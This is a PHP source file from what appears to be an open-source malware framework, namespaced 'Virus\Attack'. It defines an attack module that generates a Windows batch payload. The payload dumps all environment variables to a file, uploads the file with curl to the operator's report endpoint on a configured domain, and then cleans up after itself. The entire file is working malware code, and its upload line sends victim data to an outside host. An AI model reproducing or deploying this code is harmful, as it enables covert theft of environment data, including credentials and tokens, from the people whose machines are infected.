<?php

namespace Kelvinho\Virus\Attack\Packages\Windows\OneTime\CollectEnv;

use Kelvinho\Virus\Attack\AttackBase;
use Kelvinho\Virus\Attack\BaseScript\Windows;

/**
 * Class CollectEnv. Collects environment variables.
 *
 * @package Kelvinho\Virus\Attack\Packages\Windows\OneTime
 * @author Quang Ho <157239q@gmail.com>
 * @copyright Copyright (c) 2020 Quang Ho <https://github.com/157239n>
 * @license http://www.opensource.org/licenses/mit-license.html  MIT License
 */
class CollectEnv extends AttackBase {
    private array $data = [];

    public function setEnv(array $data): CollectEnv {
        $this->data = $data;
        return $this;
    }

    public function getEnv(): array {
        return $this->data;
    }

    public function generateBatchCode(): void {
        //@formatter:off ?>
        chCp 65001
        set > "%~pd0env"
        <?php echo Windows::payloadConfirmationLoop($this->virus_id, $this->attack_id, $this->generateUploadCode());
        echo Windows::cleanUpPayload();
        //@formatter:on
    }

    private function generateUploadCode(): string {
        ob_start(); ?>
        curl --form "envFile=@%~pd0env" --post301 --post302 --post303 -L <?php echo ALT_SECURE_DOMAIN . "/vrs/$this->virus_id/aks/$this->attack_id/report"; ?>
        <?php return ob_get_clean();
    }

    public function processExtras(string $resourceIdentifier): void {
    }

    protected function setState(string $json): void {
        $state = json_decode($json, true);
        $this->data = $state["data"];
    }

    protected function getState(): string {
        $state = [];
        $state["data"] = $this->data;
        return json_encode($state);
    }
}
